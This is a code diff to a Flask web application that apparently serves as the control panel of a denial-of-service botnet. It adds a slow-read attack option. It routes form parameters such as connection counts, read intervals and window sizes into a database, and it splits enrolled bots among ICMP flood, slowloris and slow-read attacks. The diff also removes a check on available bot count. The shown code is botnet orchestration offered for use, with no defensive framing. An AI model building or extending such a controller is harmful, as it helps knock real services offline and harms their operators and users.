@@ -83,9 +83,11 @@ def slowl_read():
     read_bytes = int(request.form["read_bytes"])
     window_size_start = int(request.form["window_size_start"])
     window_size_end = int(request.form["window_size_end"])
-    attacks.execute_attack(
-        attacks.slow_read, attack_duration, number_of_connections, connection_rate, attack_duration, pipeline_factor, read_interval, read_bytes, window_size_start, window_size_end
-    )
+    db.slow_read_insert(number_of_connections, connection_rate, attack_duration, pipeline_factor, read_interval, read_bytes, window_size_start, window_size_end)
+    
+    # attacks.execute_attack(
+    #     attacks.slow_read, attack_duration, number_of_connections, connection_rate, attack_duration, pipeline_factor, read_interval, read_bytes, window_size_start, window_size_end
+    # )
     return "nothing"
 
 
@@ -93,17 +95,17 @@ def slowl_read():
 def execute_attacks():
     icmp_flood_bot_count = int(request.form["icmp_flood_bot_count"])
     slowloris_bot_count = int(request.form["slowloris_bot_count"])
+    slow_read_bot_count = int(request.form["slow_read_bot_count"])
     attack_duration = int(request.form["attack_duration"])
-
-    # if (icmp_flood_bot_count + slowloris_bot_count) > db.count_bots():
-    #     return "Not enough bots"
-
     attack_info = {
         "icmp_flood": {
             "bots": icmp_flood_bot_count,
         },
         "slowloris": {
             "bots": slowloris_bot_count,
+        },
+        "slow_read": {
+            "bots": slow_read_bot_count,
         },
     }
     db.change_attack_duration(attack_duration)
@@ -144,7 +146,6 @@ def victim_data():
 @app.route("/count_bots", methods=["GET", 'POST'])
 def count_bots():
     bot_count = db.count_bots()
-    print(f"{bot_count} sfsdf")
     return str(bot_count)
 
 @app.route("/show_bot_count")
